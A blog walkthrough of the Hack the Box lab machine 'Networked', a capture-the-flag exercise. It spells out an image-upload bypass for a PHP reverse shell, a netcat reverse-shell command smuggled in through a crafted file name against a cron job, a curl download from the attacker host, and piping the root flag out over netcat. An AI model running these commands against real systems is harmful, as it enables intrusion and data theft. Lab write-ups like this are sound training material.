+++
author = "Nick"
categories = ["basic", "cron", "CTF", "enumeration", "Linux", "netcat", "reverse shell", "web services", "PHP", "bash"]
date = 2019-11-16T16:47:06Z
description = ""
draft = false
thumbnail = "/images/2019/08/info-5.png"
slug = "hack-the-box-networked"
summary = "Today we are going to go though the easy box, Networked. Lets get into it!"
tags = ["basic", "cron", "CTF", "enumeration", "Linux", "netcat", "reverse shell", "web services", "PHP", "bash"]
title = "Hack the Box - Networked"
url = "/hack-the-box-networked"

+++


Today we are going to go though the easy box, Networked. This box was pretty unstable since it has just released a few days ago. Anyway, lets get into it!

You guessed it, we are starting it off with our standard nmap scan: ```nmap -sC -sV -oA networked 10.10.10.146```. Our results come back pretty basic. A denied port 443, ssh and http.

![](/images/2019/08/image-114.png)

We head over to see what website the box is serving and we see a standard web page.

![](/images/2019/08/image-92.png)

Source doesn't have much of anything aside from a hint of an uploader later on.

![](/images/2019/08/image-93.png)

So those pages could be active but not yet added to this page listing. We'll continue our enumeration with gobuster to see if any of the common results come back.

![](/images/2019/08/image-94.png)

We do indeed see some commonly named items. backup and uploads are good starts. We head over to backup and we find a backup.tar.

![](/images/2019/08/image-95.png)

We download the backup.tar and unzip it

![](/images/2019/08/image-96.png)

These .php files are all presumably live on our current host. So when we try to head over to photos.php, we do indeed have some content.

![](/images/2019/08/image-97.png)

Now all we have to do is check the source of these pages to see what is happening. Essentially upload.php is only letting us upload images types, change the underscores for periods and setting permissions.

![](/images/2019/08/image-99.png)

The lib.php has some interesting code for validating the file type. It also has a small snippet for validating a filename for an 'attack'.

![](/images/2019/08/image-100.png)

So our goal here is to simply upload a reverse shell and have it execute. The first thing we'll do is copy our [standard reverse php shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) file into our working directory. We'll then make a copy under the name 10_10_15_222.php.png since we know that the page with audit the filename and type. Now we'll modify the script accordingly.

![](/images/2019/08/image-101.png)

We also know that the lib.php is checking our file type. We can easily bypass this by adding GIF89a; at the header of our reverse shell. You can see other forms of file upload bypassing [here](https://github.com/xapax/security/blob/master/bypass_image_upload.md).

![](/images/2019/08/image-102.png)

Next we start up a Netcat session listing on our defined port. Then upload the file to the server.

![](/images/2019/08/image-103.png)

Next thing we know...

![](/images/2019/08/image-98.png)

We have a shell. Poking around a bit here doesn't have much. We see there is only 1 user, guly, when we look at /home. So lets see if we can LinEnum the machine. Head over to /tmp and download our file. In this case, wget is not on the machine, so we use ```curl -o lin.sh http://10.10.15.227/LinEnum.sh``` this time to get our file.

![](/images/2019/08/image-104.png)

We don't see much. We do see a file called check_attack.php in Guly's home directory. As we look at the file, we see what looks to be an easy command injection on line 30.

![](/images/2019/08/image-106.png)

We also have crontab.guly as well.

![](/images/2019/08/image-107.png)

So it seems that every 3 minutes, php is called to run check_attack.php. With these two combined we can create a netcat connection back to our machine!

We will head over to our upload directory. Here we will create a file. ```touch "; nc 10.10.15.227 9999 -c bash```. This will create a file that is called by the check_attack.php file. In this case, it will concatinate the ```rm -f``` command and execute our command, in this case, nc to our machine.

![](/images/2019/08/image-105.png)

Now that we have a shell as user, lets snag the flag! We upgrade our shell and start enumeration. We see that guly can run the following as root.

![](/images/2019/08/image-108.png)

When we look at the contents of this file, we see the following:

![](/images/2019/08/image-109.png)

So now that we know we can command inject in this script we can use it to get the root flag. Trying to cat /root/root.txt won't work out for us because of our regex expression list doesn't support a period. Now we could escape around it but it's actually easier to make a small shell script and call it.

![](/images/2019/08/image-111.png)

So here we echo our command into a file by using ```echo "cat /root/root.txt | nc 10.10.15.227 6969" > file```. The reason we are piping it to netcat is because I want the file on my attacking machine. So on our machine we start netcat listening on port 6969: ```nc -lvnp 6969 > root.txt``` then export it to root.txt.

Now all we do is call the same shell script as before but point it to our newly created script file:

![](/images/2019/08/image-113.png)

And we see our Netcat light up and receive the file.

![](/images/2019/08/image-112.png)

We have the flag!

Now we can use this same approach to do plenty of other things, this was just the fastest way to the flag. We could make a script to add ourselves to the sudoers file, copy ssh keys, create ssh keys or anything else because we are executing this command as root.

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

